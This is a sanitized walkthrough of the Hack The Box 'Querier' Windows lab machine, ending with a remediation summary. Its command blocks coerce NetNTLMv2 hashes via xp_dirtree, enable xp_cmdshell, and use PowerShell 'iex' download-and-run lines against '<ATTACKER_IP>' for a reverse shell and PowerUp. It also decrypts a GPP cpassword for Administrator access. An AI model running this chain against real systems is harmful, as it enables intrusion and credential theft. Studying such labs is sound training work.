# HTB — Querier | Professional Walkthrough

**Difficulty:** Medium  •  **Category:** Enumeration / Credential Access / Privesc  •  **OS:** Windows (Domain: HTB.LOCAL)  •  **Focus:** SMB, MSSQL (TCP/1433), Group Policy Preferences

> Sanitized: no flags, credentials, or live target details. `<TARGET_IP>` / `<ATTACKER_IP>` replace live values.

## Executive Summary
Querier chains four issues. A world-readable **SMB** share exposes a macro-enabled Excel workbook that hardcodes an **MSSQL** connection string. Those low-privilege DB credentials are used to coerce the SQL service into authenticating to an attacker host (`xp_dirtree`), leaking a **NetNTLMv2** hash that cracks to `mssql-svc`. That account is SA-capable, so `xp_cmdshell` provides a foothold. Local enumeration (PowerUp) then finds a cached **Group Policy Preferences** `Groups.xml` whose AES-encrypted `cpassword` (Microsoft's public key) decrypts to the local **Administrator** password.

**Risks:** OWASP A05; A07; A02; CWE-798; CWE-522; CWE-257; CWE-306.

## 1. Recon & Port Scanning
```bash
sudo nmap -Pn -sS --min-rate 3000 -p- <TARGET_IP> -oA nmap/full
sudo nmap -Pn -sV -sC -p 135,139,445,1433,5985 <TARGET_IP> -oA nmap/sv
```
Sanitized result:
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server
5985/tcp open  http          Microsoft HTTPAPI (WinRM)
```
The `ms-sql-ntlm-info` script leaks the domain **HTB.LOCAL**. SMB, MSSQL and WinRM are the interesting services.

## 2. SMB Enumeration (null session)
List shares anonymously, then read the non-default one:
```bash
smbclient -N -L //<TARGET_IP>/
# Sharename: Reports (Disk)
smbclient -N //<TARGET_IP>/Reports
smb: \> ls
smb: \> get "Currency Volume Report.xlsm"
```
A macro-enabled workbook (`.xlsm`) is downloadable without credentials.

## 3. Credential Access — Hardcoded MSSQL Creds in Macro
An `.xlsm` is a ZIP; the VBA macro lives in `xl/vbaProject.bin`. Extract and grep readable strings:
```bash
unzip "Currency Volume Report.xlsm"
strings xl/vbaProject.bin
```
Near the top, the connection string exposes the DB user and password:
```
Driver={SQL Server};Server=QUERIER;Database=volume;Uid=reporting;Pwd=<REDACTED>
```

## 4. Credential Access — Coerce NetNTLMv2 via xp_dirtree
The `reporting` user is not sysadmin, so `xp_cmdshell` is denied. Instead, force the SQL service account to authenticate to an attacker SMB share and capture the NetNTLMv2 hash:
```bash
# Terminal 1 — capture
sudo responder -I tun0

# Terminal 2 — trigger coercion
impacket-mssqlclient reporting@<TARGET_IP> -windows-auth
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');   -- returns 0 (not SA)
SQL> EXEC xp_dirtree '\\<ATTACKER_IP>\share\file';
```
Responder captures `QUERIER\mssql-svc` NetNTLMv2. Crack it offline:
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# → mssql-svc : <REDACTED>
```

## 5. Foothold — xp_cmdshell as mssql-svc
`mssql-svc` is SA-capable, so enable and use `xp_cmdshell`:
```bash
impacket-mssqlclient mssql-svc@<TARGET_IP> -windows-auth
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');   -- returns 1
SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';             -- querier\mssql-svc
```
Catch a reverse shell (e.g. Nishang `Invoke-PowerShellTcp` hosted over HTTP):
```bash
python3 -m http.server 80
# in the SQL shell:
SQL> EXEC xp_cmdshell 'powershell iex(new-object net.webclient).downloadstring("http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1")';
```

## 6. Privilege Escalation — GPP cpassword
Run PowerUp to enumerate local privesc; it flags a cached Group Policy Preferences file:
```powershell
iex(new-object net.webclient).downloadstring("http://<ATTACKER_IP>/PowerUp.ps1"); Invoke-AllChecks
type "C:\ProgramData\Microsoft\Group Policy\History\{GUID}\Machine\Preferences\Groups\Groups.xml"
```
The `cpassword` attribute is AES-encrypted with Microsoft's publicly documented key, so it decrypts trivially (`gpp-decrypt` or a small AES script) to the local **Administrator** password. Log in with it:
```bash
impacket-psexec administrator:'<REDACTED>'@<TARGET_IP>
C:\Windows\system32> whoami        # nt authority\system
```

## Remediation (summary)
Remove hardcoded credentials from documents/macros and rotate them; restrict share ACLs so business data is not world-readable; apply least privilege to SQL service accounts and disable/limit `xp_dirtree`/`xp_cmdshell`; block outbound SMB (139/445) to untrusted hosts and enforce SMB signing to defeat coercion; remediate GPP cpassword (MS14-025), purge cached `Groups.xml`, and use LAPS for local admin passwords.

See `FINDINGS.md` for detailed findings, impact and re-test.
